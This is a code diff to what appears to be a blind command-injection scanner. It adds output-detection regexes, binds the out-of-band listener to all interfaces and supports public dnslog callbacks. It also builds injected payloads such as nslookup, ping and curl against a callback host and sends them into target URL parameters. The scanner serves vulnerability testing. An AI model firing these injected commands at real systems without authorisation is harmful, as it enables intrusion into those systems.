@@ -11,7 +11,7 @@ import requests
 
 from tools.http_client import build_url
 from tools.log_utils import get_logger
-from tools.payload_engine import generate
+from tools.payload_engine import generate, render_oob_payload
 from tools.settings import settings
 from tools.verification_oracle import ConfidenceVoter
 
@@ -42,12 +42,26 @@ OUTPUT_INDICATORS = [
     (r"FreePhysicalMemory", "windows_wmic"),
     (r"ProcessorId", "windows_wmic"),
     (r"HostName|Domain|UserName", "windows_env"),
+    (r"nt authority\\", "windows_whoami"),
+    (r"^[a-z0-9_.-]+\\[a-z0-9_.-]+$", "windows_user", ),
+    (r"Linux \w+ [\d.]+-", "uname"),
+    (r"Darwin \w+", "uname"),
+    (r"root@", "user"),
+    (r"groups?=\d+", "id_output"),
 ]
 
 CLEAN_VALUE = "CMDI_NOMINAL_000"
 
 
 class _OobServer:
+    """Local OOB listener (DNS + HTTP) for blind CMDi.
+
+    - UDP socket binds 0.0.0.0 so LAN / VPN targets can reach the callback.
+    - When a public dnslog is configured via AIMY_OOB_DOMAIN /
+      AIMY_OOB_CALLBACK_URL, those are used instead (verification is expected
+      out-of-band by the caller / AI agent).
+    """
+
     def __init__(self, timeout=6.0):
         self.port = 0
         self.timeout = timeout
@@ -55,6 +69,9 @@ class _OobServer:
         self._sock = None
         self._thread = None
         self._lan_ip = self._get_lan_ip()
+        self.used_public = False
+        self.public_domain = ""
+        self.public_url = ""
 
     def _get_lan_ip(self):
         try:
@@ -66,10 +83,23 @@ class _OobServer:
         except Exception:
             return "127.0.0.1"
 
+    def _public_config(self):
+        try:
+            from tools.settings import settings
+            return (settings.oob_domain or "").strip(), (settings.oob_callback_url or "").strip()
+        except Exception:
+            return "", ""
+
     def start(self):
+        pub_domain, pub_url = self._public_config()
+        if pub_domain or pub_url:
+            self.used_public = True
+            self.public_domain = pub_domain
+            self.public_url = pub_url
+            return pub_url or "http://%s/" % pub_domain, pub_domain
         try:
             self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            self._sock.bind(("127.0.0.1", 0))
+            self._sock.bind(("0.0.0.0", 0))
             self._sock.settimeout(self.timeout)
             self.port = self._sock.getsockname()[1]
         except OSError:
@@ -197,21 +227,37 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
 
         if cb_domain:
             result["oob_tested"] = True
+            if oob_server.used_public:
+                result["oob_channel"] = "public"
+                result["oob_note"] = (
+                    "Public dnslog configured (AIMY_OOB_DOMAIN / AIMY_OOB_CALLBACK_URL): "
+                    "confirm the callback out-of-band (e.g. dnslog / interactsh API)."
+                )
+            else:
+                result["oob_channel"] = "local"
+                result["oob_note"] = (
+                    "Local OOB listener on LAN IP; external targets need a public "
+                    "callback (set AIMY_OOB_DOMAIN / AIMY_OOB_CALLBACK_URL)."
+                )
             templates = []
-            if cb_domain:
-                templates.append("nslookup %s" % cb_domain)
-                templates.append("ping -c 1 %s" % cb_domain)
-                templates.append("dig +short %s" % cb_domain)
-            if cb_url:
-                templates.append("curl %s" % cb_url)
-                templates.append("wget %s" % cb_url)
+            for entry in generate("cmdi", "blind_oob", "all"):
+                rendered = render_oob_payload(entry["payload"], cb_domain, cb_url or "")
+                if rendered and "{{" not in rendered:
+                    templates.append(rendered)
+            # Guarantee at least the core templates exist.
+            if not templates:
+                templates = [
+                    "nslookup %s" % cb_domain,
+                    "ping -c 1 %s" % cb_domain,
+                    "curl %s" % (cb_url or ""),
+                ]
             for payload in templates:
                 try:
                     sess.get(build_url(url, param, payload), timeout=timeout)
                 except Exception:
                     pass
 
-            if oob_server.caught.wait(timeout=min(timeout, 6.0)):
+            if not oob_server.used_public and oob_server.caught.wait(timeout=min(timeout, 6.0)):
                 voter.add_vote("oob_callback", ConfidenceVoter.vote_oob_callback(True))
                 result["vulnerable"] = True
                 result["type"] = "oob_callback"
@@ -219,6 +265,7 @@ def check(url: str, param: str, sess: Optional[requests.Session] = None,
                 result["payload"] = templates[0] if templates else ""
 
         oob_server.stop()
+
 
     result["confidence_score"] = round(voter.score, 2)
     result["confidence"] = voter.level.value
